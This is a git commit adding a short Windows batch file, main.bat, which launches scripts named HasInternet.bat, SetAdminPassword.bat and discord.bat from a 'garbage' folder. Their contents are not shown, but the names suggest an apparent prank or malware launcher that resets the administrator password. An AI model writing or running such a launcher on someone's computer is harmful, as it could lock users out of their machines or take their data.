698f2dfe8c253b22e7388b684cbc14f299b2e3dd
ltzmrchicken <130897982+ILove-wheightlifting@users.noreply.github.com>
2025-03-26 11:19:49 -0400

    Add files via upload

---
+++ main.bat
@@ -0,0 +1,10 @@
+@echo off
+
+@REM start garbage\MAINVBS.vbs
+
+start garbage\HasInternet.bat
+start garbage\SetAdminPassword.bat
+start garbage\discord.bat
+@REM start /min garbage\audio.bat
+
+exit
